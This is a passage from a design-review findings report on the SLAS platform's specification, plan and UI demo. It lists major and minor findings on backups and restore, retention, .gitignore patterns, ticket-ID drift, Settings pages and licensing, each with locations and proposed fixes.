### M8. Quickstart nightly backups and `slas backup now|restore` have no executing service in the default profile and no phase
Where: `CLAUDE.md:125`, `CLAUDE.md:129`, `CLAUDE.md:132`, `CLAUDE.md:576-577`, `CLAUDE.md:764`, `docs/DEVELOPMENT_PLAN.md:159-160`, `docs/DEVELOPMENT_PLAN.md:138`, `docs/ui-demo/slas-ui-demo.html:1080-1083`, `CLAUDE.md:712-763`, `docs/DEVELOPMENT_PLAN.md:39-42`, `docs/DEVELOPMENT_PLAN.md:158-160`, `docs/ui-demo/slas-ui-demo.html:1080`
Also raised as: Quickstart promises nightly backups but no base-profile service or plan phase produces them

What the documents say: §3 and §8.4 make nightly Postgres dump, Qdrant snapshot and MinIO mirror mandatory in quickstart, and §3 lists `slas backup now|restore`, but the only backup component (backup-runner) is listed under the prod profile in §12, and no phase P0-P12 schedules the quickstart runner, the CLI commands, or a restore test; P9 covers station backups only and P12 covers pgBackRest only.

Why it matters: A required quickstart component is never built: the Admin 'Health and backups' panel in the demo has nothing behind it, `slas backup restore` has no defined path, and §3's zero-manual-setup promise fails. Whether it is a container (ADR per §15) or an install.sh host cron changes install.sh and the host footprint.

Fix: CLAUDE.md §12: add `backup-runner` to the default services (networks: [slas-backend, slas-knowledge], volume ${SLAS_DATA_ROOT}/Backups, nightly pg_dump + Qdrant snapshot API + `mc mirror`, 14-day retention) and keep line 764 as 'prod adds pgBackRest PITR + object-lock'; §13 add `services/backup-runner`. DEVELOPMENT_PLAN.md P1 scope: add 'backup-runner (postgres + minio) and `slas backup now|restore`'; P1 done-when: add '`slas backup now` then `slas backup restore` into an empty stack reproduces the added user and the changed setting'; P5 scope: add 'Qdrant snapshot joins the nightly backup'. PROMPTS.md P1 and P5: mirror those lines.

Owner decision: (a) Recommended default: a backup-runner container in quickstart (needs an ADR as a new container; no host footprint). (b) install.sh installs a host systemd timer / cron that runs `slas backup now`; touches the host and weakens the one-command idempotent claim.

Invariants: INV-10

Traceability: lenses operability, plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#6, operability#1


### 3.11 Data lifecycle: storage, backups, retention

### M1. §4.4 points to §5.4 for the contents of Tickets/<ticket-id>/, and §5.4 never says; no manifest ties a ticket's files together
Where: `CLAUDE.md:240`, `CLAUDE.md:341`, `CLAUDE.md:235`, `CLAUDE.md:238-239`, `CLAUDE.md:242`, `docs/ui-demo/slas-ui-demo.html:801`, `CLAUDE.md:238`, `CLAUDE.md:239`, `CLAUDE.md:587`, `CLAUDE.md:235-240`, `docs/ui-demo/slas-ui-demo.html:919`, `docs/ui-demo/slas-ui-demo.html:1230`, `CLAUDE.md:232-236`, `CLAUDE.md:344-347`, `docs/DEVELOPMENT_PLAN.md:52-54`, `CLAUDE.md:370`, `CLAUDE.md:373`, `CLAUDE.md:347`
Also raised as: Directory keys mix run ids and ticket ids (Runs/<run>, Artifacts/<run> vs Jobs/<ticket>) and the Runs/Tickets relationship is undefined; 'Run' is used as a first-class object but never related to a ticket; Coding tickets have no journal location in the filesystem layout; SOP/report artefacts have several candidate locations and an inconsistent file set (.pdf and zh-Hans variant missing from §4.4)

What the documents say: §5.4 defines the ticket record but not the directory; one ticket's files sit under Tickets/, Runs|Jobs/, Artifacts/ and SOP/ keyed by <run>, <ticket> and <ticket-id>, and the demo adds 'the run folder'. The run-to-ticket relationship is settled ('every job is a ticket' → 1:1), but the file enumeration is not.

Why it matters: Export, backup (#7), any MinIO mirror (#6) and future retention must enumerate a ticket's files; without a stated list each walks directories differently.

Fix: §5.4: "Tickets/<ticket-id>/ holds ticket.json and manifest.json, rewritten by the kernel at every state change, listing {path, kind: journal|log|screen|sol|report|sop|export|artifact|bundle, sha256, bytes} for every file wherever it lives; <run> and <ticket> in §4.4 are the ticket id; exports, backups and reapers iterate the manifest." P2 done-when: "the NullAgent ticket's manifest lists every file the run produced".

Owner decision: yes

Invariants: INV-13, INV-6

Traceability: lenses fresh-data-lifecycle, fresh-runtime-state, internal-consistency, spec-ambiguity; ids fresh-data#21, internal-consistency#43, spec-ambiguity#4, fresh-state#30, internal-consistency#11

### M2. .gitignore's unanchored Models/, Backups/ and data/ hide source and fixture directories; /AI/ is repo-relative
Where: `.gitignore:25-29`, `CLAUDE.md:23`, `README.md:28`, `CLAUDE.md:231`, `CLAUDE.md:687-688`, `.gitignore:25-26`
Also raised as: .gitignore data patterns are unanchored and will swallow fixture and source directories; /AI/ is a no-op; .gitignore ignores unanchored `data/`, `Models/`, `Backups/` — source and fixture directories at any depth are silently excluded; .gitignore `/AI/` is a no-op: the data root is an absolute host path, not a repo path

What the documents say: Verified with git check-ignore: `docs/Models/x`, `services/git-broker/data/x` and `tests/fixtures/Backups/x` are ignored; `/AI/` matches only `<repo>/AI/`, which the default data root never is. README never states where platform data lives.

Why it matters: A service's `data/` package or a test fixture directory named `Models/` silently vanishes from commits; the `/AI/` line guards nothing.

Fix: .gitignore lines 25-29 → `# platform data lives in ${SLAS_DATA_ROOT} (default /AI/Agent), outside this repo` and anchor any local-run guards: `/.slas-data/`, `/data-root/`; drop `/AI/`, `data/`, `Models/`, `Backups/`. README: one line under Quick start, "Platform data lives in `${SLAS_DATA_ROOT}` (default `/AI/Agent`), never inside the checkout."

Traceability: lenses fresh-data-lifecycle, fresh-prompts-adr-gitignore, fresh-supply-chain; ids fresh-data#29, fresh-bundle#22, fresh-prompts#61, fresh-prompts#62

### M3. Run artifacts are placed both under ${SLAS_DATA_ROOT} and in MinIO with no statement of which is the record
Where: `CLAUDE.md:183`, `CLAUDE.md:235`, `CLAUDE.md:238`, `CLAUDE.md:576-577`, `CLAUDE.md:715-716`, `docs/PROMPTS.md:211`

What the documents say: §4.4 and the compose volumes put every journal, report and artifact on the data-root filesystem, while §4.2, §8.4 and the P12 prompt treat MinIO as the run-artifact store (mirrored, object-locked). Nothing says what is copied to MinIO, when, or which copy exports, RCA retrieval, retention and restore read.

Why it matters: The P2 kernel must pick a write target for artifacts; P12's object-lock only applies to objects, so the P12 prompt is unimplementable if artifacts stay on the filesystem. Two unsynchronised stores diverge after a crash.

Fix: State one record. Recommended: "The data-root filesystem is the record for tickets, journals, run evidence and repos (the api, orchestrator, sandbox and broker already mount it). MinIO holds Knowledge documents and receives a mirror of closed tickets' evidence for backup (object-lock in prod)." Amend §4.2 label to 'MinIO (docs, closed-ticket mirror)' and the P12 prompt to 'object-lock on the ticket mirror'. Or the reverse (MinIO as record, kernel uploads at CLOSE from a manifest). Record in an ADR.

Owner decision: filesystem as record (recommended: matches §4.4, the bind-mounts and Method 2 Git; needs a filesystem snapshot in the backup set, see #7) vs MinIO as record (object-lock and S3 tooling; needs an upload step at CLOSE and changes every path in §4.4).

Traceability: lenses fresh-data-lifecycle; ids fresh-data#6

### M4. `slas backup restore` scope is undefined; on-disk truth (Projects/<slug>/.git, Tickets/, SOP/, Skills/, Knowledge/, journals) is outside every backup set
Where: `CLAUDE.md:132`, `CLAUDE.md:234`, `CLAUDE.md:238-242`, `CLAUDE.md:245`, `CLAUDE.md:417`, `CLAUDE.md:183`, `CLAUDE.md:576-577`, `docs/DEVELOPMENT_PLAN.md:161-162`, `CLAUDE.md:125`, `CLAUDE.md:764`
Also raised as: No backup set covers Projects/<slug>/.git, Tickets/, Runs/, Jobs/, SOP/, Skills/ or Knowledge/

What the documents say: §8.4 enumerates four stores (Postgres, Qdrant, MinIO, stations) while §4.4 puts tickets, journals, SOPs, the skills library, the knowledge corpus and every 'one truth' Git repo on plain disk under ${SLAS_DATA_ROOT}; none is in a backup set, `Backups/` has no filesystem slot, 'MinIO mirror' has no destination, and `restore` has no defined order, consistency point or acceptance test before the prod-only drill in P12. §4.2 additionally says run artifacts live in MinIO while §4.4 shows them on disk, so which store is authoritative is unstated.

Why it matters: A disk failure loses INV-6 journals and the agent's repositories while the database restores cleanly, leaving tickets whose evidence, SOP files and code no longer exist — the run report can no longer say what was executed (value 1.2 #6).

Fix: CLAUDE.md §8.4: replace the quickstart sentence with a table store → method → destination → restore order: (1) Postgres dump, (2) `${SLAS_DATA_ROOT}` rsync excluding `Coding/*/Container/` and `Models/` (covers Projects, Tickets, SOP, Skills, Knowledge, journals), (3) MinIO mirror, (4) Qdrant snapshot (derived, see #19), (5) KEK escrow (#2); destination `${SLAS_BACKUP_TARGET}`, which `slas doctor` refuses if it is the same filesystem as the data root. Define `slas backup restore <set>`: stop api/orchestrator/executors → restore 1→4 → Alembic `upgrade head` → `slas doctor` → three-part result. State in §4.2/§4.4 which of MinIO or disk is authoritative for run artifacts. DEVELOPMENT_PLAN: add a quickstart restore criterion by P7 ('restore onto a fresh VM reproduces a ticket with its journal, screenshots, SOP files and Projects/<slug>/.git').

Invariants: INV-6

Traceability: lenses fresh-data-lifecycle, operability; ids operability#3, fresh-data#7

### M5. No retention policy for screenshots, SOL/syslog streams, run bundles, artifacts or station backups; retention is deferred to P10 and only for screenshots
Where: `CLAUDE.md:304`, `CLAUDE.md:352-353`, `CLAUDE.md:233`, `CLAUDE.md:662`, `CLAUDE.md:125`, `CLAUDE.md:568-572`, `docs/DEVELOPMENT_PLAN.md:146-147`, `docs/PROMPTS.md:192`, `docs/ui-demo/slas-ui-demo.html:807`

What the documents say: The only lifetimes in the documents are the sandbox overlay TTL and the 14-day backup window; screenshots (two per GUI step), SOL/syslog streams (72 h runs), 1.8 GB run bundles, Artifacts, Bundles and a full station backup per factory ticket have none. The plan schedules 'screenshot retention policy' in P10 although screenshots start in P4 and run bundles in P7, and §8.2 has no disk metric and no behaviour when the data root is full.

Why it matters: A busy line fills ${SLAS_DATA_ROOT} in weeks; an executor that cannot append the write-ahead journal must stop before the power action (INV-6) but nothing says so, and an implementer must guess every lifetime.

Fix: CLAUDE.md add §8.5 'Retention' with defaults in `config/retention.yaml` (add to §13): journals never deleted (compressed after 30 d); screenshots 90 d with thumbnails 1 y; raw SOL/syslog 180 d; Artifacts 180 d; Bundles 30 d; station backups last 5 per station; Container overlays 24 h; audit rows never. Enforced nightly by backup-runner; each ticket shows 'evidence expires on <date>'. §8.2 add `slas_data_root_free_bytes`; §10.2/§10.3 add the rule 'executors refuse to ARM a step when free space < 5 GB and set the run to Needs review with a three-part error'. DEVELOPMENT_PLAN: move the retention policy from P10 to P4 (first screenshots) and add the low-disk rule to P7 done-when.

Owner decision: Lifetimes are the owner's call; recommended defaults are listed in the fix. The one non-negotiable is that journals and audit rows are never pruned.

Invariants: INV-6

Traceability: lenses operability; ids operability#6


### 3.12 Naming and cross-document drift

### M1. Validation jobs carry a run number separate from their ticket id
Where: `docs/ui-demo/slas-ui-demo.html:383`, `docs/ui-demo/slas-ui-demo.html:1230`, `docs/ui-demo/slas-ui-demo.html:909-911`, `docs/ui-demo/slas-ui-demo.html:1055`, `CLAUDE.md:341`

What the documents say: Validation work is identified as 'run 418/419' in the header, Home, Runs table, report filenames and Admin server status while a ticket V-419 is created alongside; Coding and Factory rows in the same Runs column show ticket ids. One job has two identifiers and two numbering sequences.

Why it matters: §5.4 says the job is the ticket; a parallel run sequence needs its own table, mapping and UI copy, and users will quote the wrong number to each other.

Fix: Demo: use the ticket id (T-validation-418) as the only identifier in the Validation header, Home, Runs table, Admin server status and report filenames; drop 'Run N'. If a short display number is ever wanted, §5.4 must define it as a display alias of the ticket.

Traceability: lenses fresh-ui-and-ux; ids fresh-ui#6

### M2. Ticket id format drifts between T-xxxx, T-<agent>-<seq>, T-coding-n and the UI demo's C-1187 / F-2291
Where: `CLAUDE.md:258`, `CLAUDE.md:344`, `CLAUDE.md:611`, `CLAUDE.md:653`, `docs/ui-demo/slas-ui-demo.html:235`, `docs/ui-demo/slas-ui-demo.html:252`, `CLAUDE.md:599`, `docs/ui-demo/slas-ui-demo.html:1230`, `docs/ui-demo/slas-ui-demo.html:267`, `docs/ui-demo/slas-ui-demo.html:608`, `CLAUDE.md:438`
Also raised as: Ticket id format drifts: 'T-xxxx' in §5.1, 'T-<agent>-<seq>' in §5.4, and 'C-1187 / F-2291 / V-419' throughout the UI demo; Ticket identifiers use C-/F-/V- prefixes instead of T-<agent>-<seq>

What the documents say: CLAUDE.md uses a placeholder (`T-xxxx`), a schema form (`T-<agent>-<seq>`) and examples (`T-coding-n`), and the UI demo uses a fourth form (`C-1187`, `F-2291`); whether `<seq>` is global or per agent and zero-padded is unspecified.

Why it matters: Ticket ids appear in paths (§4.4), commit trailers (§5.7 line 438) and bug-ticket titles; the format must be fixed before the Phase 2 schemas and the UI copy.

Fix: In CLAUDE.md §5.4 line 344: 'T-<agent>-<seq>; seq is a per-agent monotonically increasing integer without padding, e.g. T-coding-42'. Line 258: replace 'T-xxxx' with 'T-<agent>-<seq>'. In docs/ui-demo/slas-ui-demo.html lines 235, 252, 270-273 and 1183: replace `C-1187`/`C-1188`/`F-2291` with `T-coding-1187`/`T-coding-1188`/`T-factory-2291`.

Owner decision: yes

Traceability: lenses cross-document, fresh-ui-and-ux, internal-consistency; ids internal-consistency#13, cross-document#21, fresh-ui#5


### 3.13 WebUI, demo and copy

### M1. Demo offers per-run BMC/host passwords typed in the wizard, a flow the SSOT does not define
Where: `docs/ui-demo/slas-ui-demo.html:1213-1214`, `CLAUDE.md:600`, `CLAUDE.md:99`, `docs/ui-demo/slas-ui-demo.html:1213`, `docs/ui-demo/slas-ui-demo.html:1214`, `docs/ui-demo/slas-ui-demo.html:1212`, `CLAUDE.md:430`
Also raised as: Validation wizard step 2 lets the user type BMC/host credentials for the run, pre-filled with masked values

What the documents say: The demo's validation wizard adds a per-run credential override with four typed fields; §9 has no such option and nothing says where the typed secret travels or is held during a run.

Why it matters: The P7 wizard session copies the demo; built naively, the credential would pass through api and orchestrator as plain values rather than as a ref.

Fix: Either drop the override from the demo, or add to §9 row 2: 'Per-run credentials, if allowed (`targets:override_credentials`), are written by the API straight into the secret store as an ephemeral ref with TTL = run lease; the plan carries only the ref.' Depends on the shared secret store from #15.

Owner decision: yes

Invariants: INV-5

Traceability: lenses fresh-shop-floor, fresh-ui-and-ux; ids fresh-floor#16, fresh-ui#10

### M2. SAMPLE_YAML runs a command on the station with `run` and no target while requiring only `screen`
Where: `docs/ui-demo/slas-ui-demo.html:1006`, `docs/ui-demo/slas-ui-demo.html:1019`, `CLAUDE.md:493`, `CLAUDE.md:515`, `CLAUDE.md:529`, `docs/DEVELOPMENT_PLAN.md:73`, `docs/ui-demo/slas-ui-demo.html:1004`, `docs/ui-demo/slas-ui-demo.html:1035`, `docs/ui-demo/slas-ui-demo.html:1037`, `CLAUDE.md:465`, `CLAUDE.md:513`
Also raised as: SAMPLE_YAML version '1.0' is not semver, yet the import says 'schema valid'

What the documents say: The same skill id in §6.3 declares `requires: [screen, ssh]`, takes a `station` target_ref and uses `ssh`. The demo version has no target input, uses `run` (which per §6.2 needs `files` in a sandbox or `ssh` on a target) and requires only `screen`, so the §5.6 capability check could not have passed; it also has no `outputs`, so the status is discarded.

Why it matters: INV-12: a skill that executes a command on a station while declaring only `screen` is a capability escalation, and the demo's import flow accepts it. It also leaves ambiguous which machine `run` executes on when no target is given.

Fix: Demo: copy the §6.3 skill verbatim (inputs station/user/password, requires [screen, ssh], the `ssh` step with id status, outputs burnin_status). CLAUDE.md §6.2: add one sentence — '`run` without a target executes only inside the Coding sandbox; on a target use `ssh`.'

Invariants: INV-12

Traceability: lenses fresh-ui-and-ux; ids fresh-ui#14, fresh-ui#13

### M3. Run report offers single-language downloads
Where: `docs/ui-demo/slas-ui-demo.html:807`, `CLAUDE.md:107`, `CLAUDE.md:360`, `docs/ui-demo/slas-ui-demo.html:801`, `docs/ui-demo/slas-ui-demo.html:642`, `docs/ui-demo/slas-ui-demo.html:1066`, `docs/ui-demo/slas-ui-demo.html:1263`
Also raised as: Language exports rendered as toggle-style chips in three places, and as an Admin 'setting'

What the documents say: The Validation report dialog has two per-language buttons, each handing out one PDF with asymmetric names (report-418.pdf vs report-418-zh.pdf), and the second is labelled in Chinese inside an English UI. Every other export in the demo follows INV-13.

Why it matters: A UI that hands out one rendering will be built as per-language endpoints, and single-language reports will circulate — the outcome §5.5 'always exported together' exists to prevent.

Fix: Demo: one button 'Download report (English + 中文)' producing both PDFs (or one archive), names report-418.en.pdf / report-418.zh-Hant.pdf, with tabs to preview either language like the walkthrough and ticket dialogs. CLAUDE.md §9: add 'export controls never offer one language'.

Invariants: INV-13

Traceability: lenses fresh-ui-and-ux; ids fresh-ui#31, fresh-ui#30

### M4. No UI entry point for Clone or project creation: `git:clone` exists but no page, sub-tab or wizard step offers it
Where: `CLAUDE.md:448-449`, `CLAUDE.md:451`, `CLAUDE.md:409-410`, `CLAUDE.md:588-589`, `docs/ui-demo/slas-ui-demo.html:538`

What the documents say: Clone is a capability and a broker operation and §5.7 speaks of 'project creation', but the Git panel's sub-views start from an existing repository, the coding wizard has no 'start from a remote' choice, and neither §9 nor the demo says where a project is created or its slug chosen.

Why it matters: P6 must invent the project-creation flow, which fixes Projects/<slug> naming, the clone progress UI and the wizard's relationship to projects.

Fix: §9: Coding page gets 'New project' with two paths — 'Empty (git init)' and 'Clone from <remote>, branch <b>' — with stepped progress through the broker; the coding wizard's Step 1 gains 'Project: <existing> | new'. Mirror in the demo.

Traceability: lenses fresh-ui-and-ux; ids fresh-ux#28

### M5. CLAUDE.md §9 fixes ten pages but §5.5/§5.7/§9 route flows through a 'Settings' page that is not in the list; the demo ships it as an eleventh page and drops two listed ones
Where: `CLAUDE.md:587-588`, `CLAUDE.md:590-592`, `CLAUDE.md:409`, `CLAUDE.md:373`, `CLAUDE.md:160-162`, `docs/ui-demo/slas-ui-demo.html:219-222`, `docs/ui-demo/slas-ui-demo.html:632`, `docs/ui-demo/slas-ui-demo.html:1062-1067`, `docs/DEVELOPMENT_PLAN.md:41`, `docs/PROMPTS.md:58-59`, `CLAUDE.md:590`, `docs/DEVELOPMENT_PLAN.md:98`, `docs/PROMPTS.md:141-142`, `docs/ui-demo/slas-ui-demo.html:219-221`, `docs/ui-demo/slas-ui-demo.html:1062`, `docs/ui-demo/slas-ui-demo.html:221`, `docs/ui-demo/slas-ui-demo.html:732`, `docs/ui-demo/slas-ui-demo.html:919`, `CLAUDE.md:587`, `CLAUDE.md:244`, `docs/DEVELOPMENT_PLAN.md:79-80`, `docs/DEVELOPMENT_PLAN.md:41-42`, `README.md:18`
Also raised as: 'Settings' is a navigation destination in §5.5, §5.7, §9, P6, PROMPTS and the demo but is absent from the ten-page list that says 'Adding a page needs an ADR'; PROMPTS also uses 'Admin → Settings' for a different thing; A 'Settings' page is referenced four times and exists in the UI demo, but is not in §9's fixed page list, which forbids new pages without an ADR; Demo navigation has no Tickets page; Demo navigation has no Knowledge page

What the documents say: The SSOT enumerates exactly ten WebUI pages and requires an ADR for any addition, yet the same file sends users to 'Settings → Git remotes' (409, 590) and to 'a Settings toggle' (373). The demo resolves this by making Settings a top-level page (and, separately, an Admin → Settings panel), while DEVELOPMENT_PLAN/PROMPTS speak of 'Admin → Settings'. Two different 'Settings' exist with no decision on which is a page.

Why it matters: Routing, the sidebar, and authz scoping (per-user remotes and report preferences vs. installation-level admin settings) differ depending on whether Settings is a page, a user-menu drawer, or part of Admin. The demo already diverged from the list, so the ambiguity is producing code-shaped decisions.

Fix: In CLAUDE.md §9 'Pages' (587-588) and the §4.2 WebUI box (160-162) write the decision down. Recommended: add 'Settings (per-user: Git remotes, report preferences)' as the eleventh page, add docs/adr/0003-settings-page.md, and name the installation-level panel 'Admin → Settings' everywhere (so 373 reads 'an Admin → Settings toggle' and DEVELOPMENT_PLAN 41 / PROMPTS 58-59 already match). Alternative: replace 'Settings → Git remotes' at 409 and 590 with 'the user menu → Git remotes', state in §9 that the user menu is not a page, and drop 'settings' from the demo PAGES array (219-222). Either way, add 'tickets' and 'knowledge' to the demo PAGES array, which omits two pages §9 requires.

Owner decision: A (recommended): Settings is the eleventh page, per-user scope, ADR-0003; installation settings live under Admin → Settings. B: no Settings page; per-user items live in a user menu that §9 declares 'not a page'; installation settings under Admin → Settings.

Traceability: lenses cross-document, fresh-cross-document-and-plan, fresh-ui-and-ux, internal-consistency, ui-and-ux; ids ui-demo-vs-spec#1, cross-document#10, internal-consistency#31, fresh-ui#1, fresh-ui#2, fresh-ui#3, fresh-ui#4, fresh-plan#4


## 4. Minor findings

Stale references, naming drift and small gaps. Each fix is a local edit; most are in the proposed-edits patch.

| # | Where | Issue | Fix |
|---|---|---|---|
| m1 | `CLAUDE.md:800-802`, `docs/adr/0000-template.md:6-16`, `CLAUDE.md:215-216`, `docs/DEVELOPMENT_PLAN.md:40`, `CLAUDE.md:133-134` | No licence inventory, NOTICE or redistribution review for third-party components; ADR template has no licence section | Add '## Licence and redistribution' (licence, redistributable?, obligations, attribution files) to docs/adr/0000-template.md. P0 deliverable: docs/THIRD_PARTY.md listing every component named in CLAUDE.md (version, licence, redistributable?, obligations); the bundle build emits NOTICE. §4.3: pin 'Redis 7.2.x (BSD-3)' or record acceptance of RSALv2 in an ADR before P1. |
| m2 | `README.md:35-37`, `CLAUDE.md:805-812` | README points the project licence decision to §15 open decisions, which do not contain it | Add open decision (12) 'Project licence and customer redistribution terms' to §15; add LICENSE to the §13 root listing and to #4's bundle layout once decided. |
| m3 | `CLAUDE.md:732-733`, `CLAUDE.md:102`, `docs/DEVELOPMENT_PLAN.md:57` | The vLLM image is created outside compose, so §12's pinning convention does not cover the largest image in the bundle | §7: Models/models.yaml carries `runtime: {image: registry.internal/vllm/vllm-openai:<ver>, image_id: sha256:…}` (global or per role); #4's images.lock lists it; install.sh loads it; model-manager refuses to start any image whose id is not in the lock and says so in a sentence. |
| m4 | `CLAUDE.md:782-783`, `CLAUDE.md:241`, `CLAUDE.md:127-128`, `CLAUDE.md:132` | Shipped skills, templates and config live in the repo, but install.sh has no seed step and `slas upgrade` has no overwrite rule | §3 step list: add "seed data root: copy skills/library → Skills/library/shipped/, templates/factory → Factory/Templates/shipped/, config/*.yaml → ${SLAS_DATA_ROOT}/config/ if absent"; "`slas upgrade` replaces only shipped/ copies and reports each changed file; user copies are never touched". P4 done-when adds: "the two §6.3 skills appear on the Skills page after a fresh install". |
| m5 | `docs/PROMPTS.md:209-210`, `docs/DEVELOPMENT_PLAN.md:159`, `CLAUDE.md:764`, `CLAUDE.md:116-125`, `docs/PROMPTS.md:210`, `CLAUDE.md:713` | P12 prompt and plan add Harbor + cosign — a registry product absent from §3 and §12's prod list, with no ADR | Owner decides (options). Then either add 'Harbor registry + cosign verification of every image digest' to CLAUDE.md §3 prod row (line 116-125) and §12 line 764 with an ADR, or edit docs/DEVELOPMENT_PLAN.md line 159 and docs/PROMPTS.md line 210 to 'cosign verification of bundle images in install.sh (registry is a site prerequisite checked by `slas doctor`)'. |
| m6 | `CLAUDE.md:758`, `CLAUDE.md:735`, `CLAUDE.md:761`, `CLAUDE.md:95` | MinIO update check is not disabled while every other component lists its telemetry/update switch | CLAUDE.md §12 line 758: add `environment: { MINIO_UPDATE: "off", MINIO_BROWSER_REDIRECT: "false" }`. |
| m7 | `CLAUDE.md:127-129`, `CLAUDE.md:131`, `CLAUDE.md:424`, `docs/DEVELOPMENT_PLAN.md:41`, `docs/ui-demo/slas-ui-demo.html:1046` | Idempotent install.sh versus 'generate .env' and 'one-time admin password'; no admin password recovery | CLAUDE.md §3 replace the pipeline with: 'generate `.env` only if absent — re-runs never change `SLAS_SECRET_KEY` (see `slas secret rotate`, #2) → … → on first run print the one-time admin password (must be changed at first login); on re-runs print "admin already initialised".' Add `user reset-password <name>` (host console only) to the CLI list and mention it under Admin → People in §9. DEVELOPMENT_PLAN P1 done-when: 'running install.sh twice leaves .env byte-identical'. |
| m8 | `CLAUDE.md:553`, `CLAUDE.md:132`, `CLAUDE.md:243`, `CLAUDE.md:614-617`, `CLAUDE.md:784`, `docs/DEVELOPMENT_PLAN.md:90-92`, `docs/ui-demo/slas-ui-demo.html:1103-1111` | Model weights and toolchains arriving by sneakernet have no import layout, checksum or compatibility procedure | CLAUDE.md §7 add: 'A model package is `Models/<model-id>/` containing the weights plus `model.yaml` (id, family, quant, licence, `min_model_manager_digest`, sha256 per file). `slas model scan` verifies hashes and compatibility and reports a mismatch in one sentence.' §3/§10.1 add: 'Toolchains ship as pinned per-language sandbox images inside the bundle; `slas toolchain add <image.tar>` loads one and records it in `toolchains.yaml`; no runtime mount, no rebuild.' Reflect `toolchains.yaml` in §4.4. |
| m9 | `CLAUDE.md:563-564`, `CLAUDE.md:702`, `CLAUDE.md:96`, `docs/DEVELOPMENT_PLAN.md:64` | Ragas telemetry needs RAGAS_DO_NOT_TRACK (not DO_NOT_TRACK); the api.openai.com grep is a static check | In §12 x-airgap add RAGAS_DO_NOT_TRACK: "true" and VLLM_NO_USAGE_STATS: "1". In §8.1 replace 'CI asserts no api.openai.com' with 'tests/eval runs the judge suite under the egress-DROP job and fails on any connect attempt; judges are constructed only with the gateway base_url'. Decide in §15 whether TruLens is needed in addition to Ragas. |
| m10 | `CLAUDE.md:654-656`, `CLAUDE.md:322`, `CLAUDE.md:261-262`, `CLAUDE.md:636` | §10.3 Factory workflow has no GATE step for the unanimous plan approval that §5.3 and §5.1 require | In CLAUDE.md §10.3 insert after line 655: 'GATE line lead approval (sentence) + Consensus Router on the plan (unanimous, §5.3) — evaluated once per template version and cached; per-job runs re-use the vote unless the template or its skills changed'. Amend §5.3 line 322 to 'Plan approval (Validation per run, Factory per template version)'. |
| m11 | `CLAUDE.md:101`, `CLAUDE.md:344-345`, `CLAUDE.md:587-588`, `CLAUDE.md:600`, `CLAUDE.md:659-660`, `docs/DEVELOPMENT_PLAN.md:124-125`, `docs/ui-demo/slas-ui-demo.html:1047-1050`, `docs/ui-demo/slas-ui-demo.html:380-402` | No document names where a pending approval is shown to an approver who is not the run's initiator, or where the line lead 'decides in the UI' | CLAUDE.md §9 after line 592: add 'Approvals. A pending approval is a ticket in state Planned shown (1) on the ticket detail (Tickets page) and (2) in a "Needs you" list on Home for every user holding the approving capability. It shows the sentence, the votes, and Approve / Decline with a note; never a toast or modal. Factory verdicts the models did not agree on appear the same way for the line lead.' DEVELOPMENT_PLAN.md P2 scope: add 'approval list on Home and Approve/Decline on ticket detail'; P7 done-when: change to 'an AC-cycle plan stays in Planned until a user with the approval capability (not necessarily the initiator) approves it from the ticket'; P9 done-when: add 'a 2-of-3 verdict appears in the line lead's Needs-you list'. |
| m12 | `CLAUDE.md:324`, `CLAUDE.md:326`, `CLAUDE.md:354-356` | Two overlapping consensus rows for RCA/diagnosis with different tally rules | Merge rows 324 and 326 into one `rca` decision: fields owner, severity, cause; majority per field; a field without majority is shown as 'your call' and, when it is `cause`, the report is also flagged 'uncertain'. |
| m13 | `CLAUDE.md:232`, `CLAUDE.md:424`, `CLAUDE.md:119`, `docs/DEVELOPMENT_PLAN.md:41-42`, `docs/ui-demo/slas-ui-demo.html:1046` | Deactivating or removing a user is undefined: workspace, owned remotes, leases, sandboxes and open tickets have no fate | P1 scope: add "deactivate user". §3 or §5.8: "Deactivating a user revokes sessions and capability tokens, stops their sandboxes, releases their leases, and deletes their owned Remotes and credential_refs (audit rows kept); their tickets, SOPs, journals and audit rows stay under the frozen user_id; Coding/<user_id>/ is retained read-only until an admin deletes it explicitly. In prod a disabled Keycloak account triggers the same at the next token check." |
| m14 | `CLAUDE.md:232`, `CLAUDE.md:437`, `CLAUDE.md:119`, `docs/ui-demo/slas-ui-demo.html:608` | Coding/<user>/ and <user>@slas.local key durable data by an undefined, possibly mutable, identifier | §4.4: "`<user>` = the immutable `user_id` (UUIDv7 assigned at creation; for OIDC mapped from `sub`); display name and login live in the users table. Commit identity: `user.name` = display name, `user.email = <login>@slas.local` (cosmetic; trailers carry the ticket)." Describe the ticket `user` field as `user_id`. |
| m15 | `CLAUDE.md:242`, `CLAUDE.md:235`, `CLAUDE.md:375-376`, `docs/ui-demo/slas-ui-demo.html:498` | Code walkthrough files have two homes in §4.4 (SOP/<ticket-id>/ and Artifacts/<run>/) | §4.4: keep SOP/<ticket-id>/ as the single home and change the Artifacts comment to 'zips (the walkthrough is linked from SOP/<ticket-id>/)'. Demo toast: 'Exported sop.en.md and sop.zh-Hant.md to SOP/T-coding-1187/.' |
| m16 | `CLAUDE.md:239`, `CLAUDE.md:245`, `CLAUDE.md:662`, `docs/DEVELOPMENT_PLAN.md:182`, `docs/ui-demo/slas-ui-demo.html:897`, `docs/PROMPTS.md:182` | Station backups have two on-disk homes: Factory/Stations/<n>/backup/ and Backups/stations/<n>/<ticket>/ | In CLAUDE.md §4.4 line 239: delete `Stations/<n>/backup/` (line 245, line 662, DEVELOPMENT_PLAN line 182 and UI demo line 897 all use `Backups/stations/<n>/…`). In §8.4 line 576: 'station state backups are written by factory-executor to `Backups/stations/<n>/<ticket>/` and included in the nightly mirror.' |
| m17 | `CLAUDE.md:241`, `CLAUDE.md:387`, `CLAUDE.md:782` | Imported skills: §5.6 stores them under Skills/library, but §4.4 also defines Skills/imported/ with no stated purpose, and the repo has skills/library | In CLAUDE.md §4.4 line 241 and §5.6 line 387: 'shipped skills (repo `skills/library/`) are copied at install to `Skills/library/`; `slas skill import` writes to `Skills/imported/<id>.skill.yaml` and fails on an id collision with `library/`; compiled StepPlans go to `Skills/compiled/<id>@<hash>.json`.' Change line 387 'stored under Skills/library' to 'stored under Skills/imported'. |
